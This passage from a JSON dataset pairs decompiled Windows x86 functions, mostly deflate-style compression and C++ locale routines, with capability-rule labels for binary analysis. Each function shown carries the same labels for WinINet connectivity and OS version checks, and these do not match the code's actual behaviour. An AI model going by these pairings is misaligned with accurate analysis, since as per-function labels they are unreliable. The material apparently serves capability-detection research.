        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418e0c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    code **ppcVar2;\n    int32_t arg_ch;\n    int32_t *unaff_EBX;\n    int32_t unaff_EBP;\n    ulong uVar3;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x2c);\n    *(unaff_EBP + -0x10) = 0;\n    if ((unaff_EBX != NULL) && (*unaff_EBX == 0)) {\n        ppcVar2 = fcn.0041e85d(0x10);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_ch = *(**(unaff_EBP + 8) + 0x18);\n            if (arg_ch == 0) {\n                arg_ch = **(unaff_EBP + 8) + 0x1c;\n            }\n            fcn.0040e09b(unaff_EBP + -0x38, arg_ch);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *ppcVar2 = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            uVar3 = fcn.0041df96();\n            ppcVar2[2] = uVar3;\n            ppcVar2[3] = uVar3 >> 0x20;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        uVar1 = *(unaff_EBP + -0x10);\n        *unaff_EBX = ppcVar2;\n        if ((uVar1 & 1) != 0) {\n            fcn.0040e115(unaff_EBP + -0x38);\n        }\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 510
    },
    "00418e91": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00418e91(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    code **arg_8h_00;\n    int32_t arg_ch;\n    int32_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x2c);\n    *(unaff_EBP + -0x10) = 0;\n    if ((unaff_EBX != NULL) && (*unaff_EBX == 0)) {\n        arg_8h_00 = fcn.0041e85d(0x18);\n        *(unaff_EBP + -0x14) = arg_8h_00;\n        *(unaff_EBP + -4) = 0;\n        if (arg_8h_00 == NULL) {\n            arg_8h_00 = NULL;\n        }\n        else {\n            arg_ch = *(**(unaff_EBP + 8) + 0x18);\n            if (arg_ch == 0) {\n                arg_ch = **(unaff_EBP + 8) + 0x1c;\n            }\n            fcn.0040e09b(unaff_EBP + -0x38, arg_ch);\n            arg_8h_00[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *arg_8h_00 = vtable.std::numpunct_char_.0;\n            fcn.00418f18(arg_8h_00);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        uVar1 = *(unaff_EBP + -0x10);\n        *unaff_EBX = arg_8h_00;\n        if ((uVar1 & 1) != 0) {\n            fcn.0040e115(unaff_EBP + -0x38);\n        }\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 505
    },
    "0041a2e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041a2e8(uint param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *in_EAX;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t *piVar14;\n    uint *puVar15;\n    int32_t iVar16;\n    int16_t *piVar17;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar12 = in_EAX[2];\n    iVar4 = in_EAX[3];\n    var_4h = 0;\n    iVar5 = in_EAX[6];\n    iVar6 = *in_EAX;\n    iVar7 = in_EAX[5];\n    iVar8 = in_EAX[1];\n    puVar15 = param_2 + 0xfe4;\n    for (iVar13 = 8; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    *(iVar6 + 2 + *(param_2 + 0x1004 + *(param_2 + 0x18fc) * 4) * 4) = 0;\n    iVar13 = *(param_2 + 0x18fc) + 1;\n    if (iVar13 < 0x23d) {\n        var_10h = param_2 + 0x1004 + iVar13 * 4;\n        var_18h = 0x23d - iVar13;\n        iVar13 = iVar13 + var_18h;\n        do {\n            iVar9 = *var_10h;\n            iVar10 = iVar9 * 4;\n            iVar11 = *(iVar6 + 2 + *(iVar10 + 2 + iVar6) * 4) + 1;\n            if (iVar7 < iVar11) {\n                var_4h = var_4h + 1;\n                iVar11 = iVar7;\n            }\n            *(iVar10 + 2 + iVar6) = iVar11;\n            if (iVar9 <= iVar5) {\n                piVar17 = param_2 + 0xfe4 + iVar11 * 2;\n                *piVar17 = *piVar17 + 1;\n                iVar16 = 0;\n                if (iVar4 <= iVar9) {\n                    iVar16 = *(iVar12 + (iVar9 - iVar4) * 4);\n                }\n                uVar3 = *(iVar10 + iVar6);\n                *(param_2 + 0x1af3c) = *(param_2 + 0x1af3c) + (iVar11 + iVar16) * uVar3;\n                if (iVar8 != 0) {\n                    *(param_2 + 0x1af40) = *(param_2 + 0x1af40) + (*(iVar10 + 2 + iVar8) + iVar16) * uVar3;\n                }\n            }\n            var_10h = var_10h + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n        if (var_4h != 0) {\n            puVar2 = param_2 + 0xfe4 + iVar7 * 2;\n            do {\n                iVar12 = iVar7 + -1;\n                for (piVar17 = param_2 + 0xfe4 + iVar12 * 2; *piVar17 == 0; piVar17 = piVar17 + -1) {\n                    iVar12 = iVar12 + -1;\n                }\n                var_4h = var_4h + -2;\n                piVar17 = param_2 + 0xfe4 + iVar12 * 2;\n                *piVar17 = *piVar17 + -1;\n                piVar17 = param_2 + 0xfe6 + iVar12 * 2;\n                *piVar17 = *piVar17 + 2;\n                *puVar2 = *puVar2 - 1;\n            } while (0 < var_4h);\n            for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n                var_10h = *puVar2;\n                if (var_10h != NULL) {\n                    piVar14 = param_2 + 0x1004 + iVar13 * 4;\n                    do {\n                        piVar14 = piVar14 + -1;\n                        iVar13 = iVar13 + -1;\n                        if (*piVar14 <= iVar5) {\n                            var_4h._0_2_ = iVar7;\n                            puVar1 = iVar6 + *piVar14 * 4;\n                            if (puVar1[1] != var_4h) {\n                                *(param_2 + 0x1af3c) = *(param_2 + 0x1af3c) + (iVar7 - puVar1[1]) * *puVar1;\n                                puVar1[1] = var_4h;\n                            }\n                            var_10h = var_10h - 1;\n                        }\n                    } while (var_10h != NULL);\n                }\n                puVar2 = puVar2 + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1298
    },
    "0041a529": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a529(int32_t *arg_8h)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    int32_t iVar8;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = -1;\n    iVar8 = arg_8h[1];\n    var_ch = arg_8h[4];\n    iVar7 = 0;\n    iVar4 = *arg_8h;\n    *(unaff_EBX + 0x18f8) = 0;\n    *(unaff_EBX + 0x18fc) = 0x23d;\n    if (0 < var_ch) {\n        do {\n            if (*(iVar4 + iVar7 * 4) == 0) {\n                *(iVar4 + 2 + iVar7 * 4) = 0;\n            }\n            else {\n                *(unaff_EBX + 0x18f8) = *(unaff_EBX + 0x18f8) + 1;\n                *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18f8) * 4) = iVar7;\n                *(iVar7 + 0x1900 + unaff_EBX) = 0;\n                var_8h = iVar7;\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < var_ch);\n    }\n    while (*(unaff_EBX + 0x18f8) < 2) {\n        if (var_8h < 2) {\n            iVar7 = var_8h + 1;\n            var_8h = iVar7;\n        }\n        else {\n            iVar7 = 0;\n        }\n        *(unaff_EBX + 0x18f8) = *(unaff_EBX + 0x18f8) + 1;\n        *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18f8) * 4) = iVar7;\n        *(iVar4 + iVar7 * 4) = 1;\n        *(unaff_EBX + 0x1900 + iVar7) = 0;\n        *(unaff_EBX + 0x1af3c) = *(unaff_EBX + 0x1af3c) + -1;\n        if (iVar8 != 0) {\n            *(unaff_EBX + 0x1af40) = *(unaff_EBX + 0x1af40) - *(iVar8 + 2 + iVar7 * 4);\n        }\n    }\n    arg_8h[6] = var_8h;\n    for (iVar8 = *(unaff_EBX + 0x18f8) / 2; 0 < iVar8; iVar8 = iVar8 + -1) {\n        fcn.0041a238(iVar8);\n    }\n    do {\n        uVar5 = *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18f8) * 4);\n        iVar8 = *(unaff_EBX + 0x1008);\n        *(unaff_EBX + 0x18f8) = *(unaff_EBX + 0x18f8) + -1;\n        *(unaff_EBX + 0x1008) = uVar5;\n        fcn.0041a238(1);\n        *(unaff_EBX + 0x18fc) = *(unaff_EBX + 0x18fc) + -1;\n        iVar7 = *(unaff_EBX + 0x1008);\n        *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18fc) * 4) = iVar8;\n        *(unaff_EBX + 0x18fc) = *(unaff_EBX + 0x18fc) + -1;\n        *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18fc) * 4) = iVar7;\n        piVar1 = iVar4 + iVar7 * 4;\n        piVar2 = iVar4 + iVar8 * 4;\n        *(iVar4 + var_ch * 4) = *piVar1 + *piVar2;\n        uVar3 = *(unaff_EBX + 0x1900 + iVar8);\n        uVar6 = *(unaff_EBX + 0x1900 + iVar7);\n        if (uVar6 <= uVar3) {\n            uVar6 = uVar3;\n        }\n        *(unaff_EBX + 0x1900 + var_ch) = uVar6 + 1;\n        piVar1[1] = var_ch;\n        piVar2[1] = var_ch;\n        *(unaff_EBX + 0x1008) = var_ch;\n        var_ch = var_ch + 1;\n        fcn.0041a238(1);\n    } while (1 < *(unaff_EBX + 0x18f8));\n    *(unaff_EBX + 0x18fc) = *(unaff_EBX + 0x18fc) + -1;\n    *(unaff_EBX + 0x1004 + *(unaff_EBX + 0x18fc) * 4) = *(unaff_EBX + 0x1008);\n    fcn.0041a2e8();\n    fcn.0041a4b2(unaff_EBX, var_8h);\n    return;\n}\n",
        "token_count": 1290
    },
    "0041a973": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041a973(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *(*(in_ECX + 0x1af34) + 0x19f2c + in_ECX) = *(in_ECX + 0x1af38);\n    if (**(in_ECX + 0x1af50) == -1) {\n        fcn.0041adb8();\n    }\n    fcn.0041a529(in_ECX + 0xf90);\n    fcn.0041a529(in_ECX + 0xfac);\n    fcn.0041a703(in_ECX);\n    fcn.0041a703(in_ECX);\n    fcn.0041a529(in_ECX + 0xfc8);\n    iVar3 = 0x12;\n    do {\n        if (*(in_ECX + 0xef6 + *(iVar3 + 0x43be3c) * 4) != 0) break;\n        iVar3 = iVar3 + -1;\n    } while (2 < iVar3);\n    *(in_ECX + 0x1af4c) = *(in_ECX + 0x1af4c) + in_EAX;\n    *(in_ECX + 0x1af3c) = *(in_ECX + 0x1af3c) + iVar3 * 3 + 0x11;\n    uVar2 = *(in_ECX + 0x1af3c) + 10U >> 3;\n    uVar1 = *(in_ECX + 0x1af40) + 10U >> 3;\n    if (uVar1 <= uVar2) {\n        uVar2 = uVar1;\n    }\n    if ((uVar2 < in_EAX + 4U) || (arg_8h == 0)) {\n        if (uVar1 == uVar2) {\n            fcn.0041ae0c(3);\n            fcn.0041ac8e(in_ECX + 0x9fc, in_ECX + 0xe7c);\n            iVar3 = *(in_ECX + 0x1af40);\n        }\n        else {\n            fcn.0041ae0c(3);\n            fcn.0041a8f8(*(in_ECX + 0xfa8) + 1, *(in_ECX + 0xfc4) + 1);\n            fcn.0041ac8e(in_ECX + 0x14, in_ECX + 0x908);\n            iVar3 = *(in_ECX + 0x1af3c);\n        }\n        uVar2 = iVar3 + 3 + *(in_ECX + 0x1af48);\n        *(in_ECX + 0x1af44) = *(in_ECX + 0x1af44) + (uVar2 >> 3);\n        *(in_ECX + 0x1af48) = uVar2 & 7;\n    }\n    else {\n        fcn.0041ae0c(3);\n        iVar3 = *(in_ECX + 0x1af48);\n        *(in_ECX + 0x1af48) = 0;\n        *(in_ECX + 0x1af44) = *(in_ECX + 0x1af44) + (iVar3 + 10U >> 3) + 4 + in_EAX;\n        fcn.0041af85(arg_8h);\n    }\n    fcn.0041a1c7();\n    if (arg_ch != 0) {\n        fcn.0041aeb8();\n        *(in_ECX + 0x1af48) = *(in_ECX + 0x1af48) + 7;\n    }\n    return (*(in_ECX + 0x1af48) >> 3) + *(in_ECX + 0x1af44);\n}\n",
        "token_count": 921
    },
    "0041ae99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ae99(uint32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = param_1 & 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n        param_1 = param_1 >> 1;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 152
    },
    "0041af85": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041af85(uint param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    uint *unaff_EDI;\n    \n    fcn.0041aeb8();\n    puVar1 = unaff_EDI + 0x6bd9;\n    if (unaff_EDI[0x6bda] - 1 <= *puVar1) {\n        (*unaff_EDI[4])(*unaff_EDI, unaff_EDI[0x6bd8], puVar1);\n    }\n    *(unaff_EDI[0x6bd8] + *puVar1) = unaff_EBX;\n    *puVar1 = *puVar1 + 1;\n    uVar3 = unaff_EBX >> 8;\n    *(*puVar1 + unaff_EDI[0x6bd8]) = uVar3;\n    *puVar1 = *puVar1 + 1;\n    if (unaff_EDI[0x6bda] - 1 <= *puVar1) {\n        (*unaff_EDI[4])(*unaff_EDI, unaff_EDI[0x6bd8], puVar1);\n    }\n    *(unaff_EDI[0x6bd8] + *puVar1) = ~unaff_EBX;\n    *puVar1 = *puVar1 + 1;\n    *(*puVar1 + unaff_EDI[0x6bd8]) = ~uVar3;\n    *puVar1 = *puVar1 + 1;\n    unaff_EDI[0x6bdb] = unaff_EDI[0x6bdb] + 0x20;\n    if (unaff_EDI[0x6bd5] == 0) {\n        uVar2 = *puVar1 + unaff_EBX;\n        if (uVar2 < unaff_EDI[0x6bda] || uVar2 == unaff_EDI[0x6bda]) {\n            fcn.00420150(unaff_EDI[0x6bd8] + *puVar1, param_1, unaff_EBX);\n            *puVar1 = *puVar1 + unaff_EBX;\n        }\n    }\n    else {\n        (*unaff_EDI[4])(*unaff_EDI, unaff_EDI[0x6bd8], puVar1);\n        *puVar1 = unaff_EBX;\n        (*unaff_EDI[4])(*unaff_EDI, param_1, puVar1);\n    }\n    unaff_EDI[0x6bdb] = unaff_EDI[0x6bdb] + unaff_EBX * 8;\n    return;\n}\n",
        "token_count": 616
    },
    "0041b2c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b2c0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t iStack4;\n    \n    while( true ) {\n        if ((((*(unaff_ESI + 0x6af70) - *(unaff_ESI + 0x6af84)) - *(unaff_ESI + 0x6af90) != -1) &&\n            (0xfef9 < *(unaff_ESI + 0x6af84))) && (*(unaff_ESI + 0x6af78) != 0)) {\n            fcn.00420150(unaff_ESI + 0x1af70, unaff_ESI + 0x22f70, 0x8000);\n            *(unaff_ESI + 0x6af88) = *(unaff_ESI + 0x6af88) + -0x8000;\n            *(unaff_ESI + 0x6af84) = *(unaff_ESI + 0x6af84) + -0x8000;\n            *(unaff_ESI + 0x6af74) = *(unaff_ESI + 0x6af74) + -0x8000;\n            puVar1 = unaff_ESI + 0x4af70;\n            iStack4 = 0x8000;\n            do {\n                *puVar1 = ~-(*puVar1 < 0x8000) & *puVar1 - 0x8000;\n                puVar1 = puVar1 + 1;\n                iStack4 = iStack4 + -1;\n            } while (iStack4 != 0);\n            puVar1 = unaff_ESI + 0x2af70;\n            iStack4 = 0x8000;\n            do {\n                *puVar1 = ~-(*puVar1 < 0x8000) & *puVar1 - 0x8000;\n                puVar1 = puVar1 + 1;\n                iStack4 = iStack4 + -1;\n            } while (iStack4 != 0);\n        }\n        if (*(unaff_ESI + 0x6af8c) != 0) break;\n        iVar2 = (**(unaff_ESI + 0xc))();\n        if ((iVar2 == 0) || (iVar2 == -1)) {\n            *(unaff_ESI + 0x6af8c) = 1;\n        }\n        else {\n            *(unaff_ESI + 0x6af90) = *(unaff_ESI + 0x6af90) + iVar2;\n        }\n        if (0x105 < *(unaff_ESI + 0x6af90)) {\n            return;\n        }\n        if (*(unaff_ESI + 0x6af8c) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 652
    },
    "0041b3d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b3d4(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    var_4h = 0;\n    *(in_EAX + 0x6af80) = 2;\n    iVar2 = *(in_EAX + 0x6af90);\n    do {\n        if (iVar2 == 0) {\n            if (*(in_EAX + 0x6af74) < 0) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n            }\n            fcn.0041a973(iVar2, 1);\n            return;\n        }\n        if (2 < *(in_EAX + 0x6af90)) {\n            uVar1 = (*(*(in_EAX + 0x6af84) + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n            *(in_EAX + 0x6af7c) = uVar1;\n            var_4h = *(in_EAX + 0x4af70 + uVar1 * 4);\n            *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_4h;\n            *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n        }\n        if ((var_4h != 0) && (*(in_EAX + 0x6af84) - var_4h < 0x7efb)) {\n            uVar3 = *(in_EAX + 0x6af90);\n            if (uVar3 <= *(in_EAX + 0x6afa0) && *(in_EAX + 0x6afa0) != uVar3) {\n                *(in_EAX + 0x6afa0) = uVar3;\n            }\n            uVar3 = fcn.0041b17f(var_4h);\n            if (*(in_EAX + 0x6af90) < uVar3) {\n                uVar3 = *(in_EAX + 0x6af90);\n            }\n        }\n        if (uVar3 < 3) {\n            var_8h = fcn.0041ab41();\n            *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + -1;\ncode_r0x0041b572:\n            *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n        }\n        else {\n            var_8h = fcn.0041ab41();\n            *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) - uVar3;\n            if ((uVar3 < *(in_EAX + 0x6af98) || uVar3 == *(in_EAX + 0x6af98)) && (2 < *(in_EAX + 0x6af90))) {\n                uVar3 = uVar3 - 1;\n                do {\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                    uVar1 = (*(in_EAX + 0x1af72 + *(in_EAX + 0x6af84)) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                    *(in_EAX + 0x6af7c) = uVar1;\n                    var_4h = *(in_EAX + 0x4af70 + uVar1 * 4);\n                    uVar3 = uVar3 - 1;\n                    *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_4h;\n                    *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n                } while (uVar3 != 0);\n                goto code_r0x0041b572;\n            }\n            *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + uVar3;\n            uVar1 = *(*(in_EAX + 0x6af84) + 0x1af70 + in_EAX);\n            *(in_EAX + 0x6af7c) = uVar1;\n            uVar3 = 0;\n            *(in_EAX + 0x6af7c) = *(*(in_EAX + 0x6af84) + 0x1af71 + in_EAX) ^ uVar1 << 5;\n        }\n        if (var_8h != 0) {\n            if (*(in_EAX + 0x6af74) < 0) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n            }\n            fcn.0041a973(iVar2, 0);\n            *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n        }\n        if (*(in_EAX + 0x6af90) < 0x106) {\n            fcn.0041b2c0();\n        }\n        iVar2 = *(in_EAX + 0x6af90);\n    } while( true );\n}\n",
        "token_count": 1356
    },
    "0041b5ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b5ff(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    bVar3 = false;\n    uVar7 = 2;\n    if (*(in_EAX + 4) < 4) {\n        fcn.0041b3d4();\n    }\n    else {\n        if (*(in_EAX + 0x6af90) != 0) {\n            do {\n                if (2 < *(in_EAX + 0x6af90)) {\n                    uVar4 = (*(*(in_EAX + 0x6af84) + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                    *(in_EAX + 0x6af7c) = uVar4;\n                    var_4h = *(in_EAX + 0x4af70 + uVar4 * 4);\n                    *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_4h;\n                    *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n                }\n                *(in_EAX + 0x6af80) = uVar7;\n                uVar7 = 2;\n                if (((var_4h != 0) && (*(in_EAX + 0x6af80) < *(in_EAX + 0x6af98))) &&\n                   (*(in_EAX + 0x6af84) - var_4h < 0x7efb)) {\n                    uVar7 = *(in_EAX + 0x6af90);\n                    if (uVar7 <= *(in_EAX + 0x6afa0) && *(in_EAX + 0x6afa0) != uVar7) {\n                        *(in_EAX + 0x6afa0) = uVar7;\n                    }\n                    uVar7 = fcn.0041b17f(var_4h);\n                    if (*(in_EAX + 0x6af90) < uVar7) {\n                        uVar7 = *(in_EAX + 0x6af90);\n                    }\n                    if ((uVar7 == 3) && (0x1000 < *(in_EAX + 0x6af84) - *(in_EAX + 0x6af88))) {\n                        uVar7 = 2;\n                    }\n                }\n                if ((*(in_EAX + 0x6af80) < 3) || (*(in_EAX + 0x6af80) < uVar7)) {\n                    if (bVar3) {\n                        iVar6 = fcn.0041ab41();\n                        if (iVar6 != 0) {\n                            if (*(in_EAX + 0x6af74) < 0) {\n                                iVar6 = 0;\n                            }\n                            else {\n                                iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n                            }\n                            fcn.0041a973(iVar6, 0);\n                            *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n                        }\n                    }\n                    else {\n                        bVar3 = true;\n                    }\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                    *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + -1;\n                }\n                else {\n                    iVar6 = *(in_EAX + 0x6af84);\n                    iVar2 = *(in_EAX + 0x6af90);\n                    iVar5 = fcn.0041ab41();\n                    *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + (1 - *(in_EAX + 0x6af80));\n                    *(in_EAX + 0x6af80) = *(in_EAX + 0x6af80) + -2;\n                    do {\n                        *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                        uVar7 = *(in_EAX + 0x6af84);\n                        if (uVar7 <= iVar6 + -3 + iVar2) {\n                            uVar4 = (*(uVar7 + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                            *(in_EAX + 0x6af7c) = uVar4;\n                            var_4h = *(in_EAX + 0x4af70 + uVar4 * 4);\n                            *(in_EAX + 0x2af70 + (uVar7 & 0x7fff) * 4) = var_4h;\n                            *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n                        }\n                        piVar1 = in_EAX + 0x6af80;\n                        *piVar1 = *piVar1 + -1;\n                    } while (*piVar1 != 0);\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                    bVar3 = false;\n                    uVar7 = 2;\n                    if (iVar5 != 0) {\n                        if (*(in_EAX + 0x6af74) < 0) {\n                            iVar6 = 0;\n                        }\n                        else {\n                            iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n                        }\n                        fcn.0041a973(iVar6, 0);\n                        *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n                    }\n                }\n                if (*(in_EAX + 0x6af90) < 0x106) {\n                    fcn.0041b2c0();\n                }\n            } while (*(in_EAX + 0x6af90) != 0);\n            if (bVar3) {\n                fcn.0041ab41();\n            }\n        }\n        if (*(in_EAX + 0x6af74) < 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n        }\n        fcn.0041a973(iVar6, 1);\n    }\n    return;\n}\n",
        "token_count": 1610
    },
    "0041c68b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
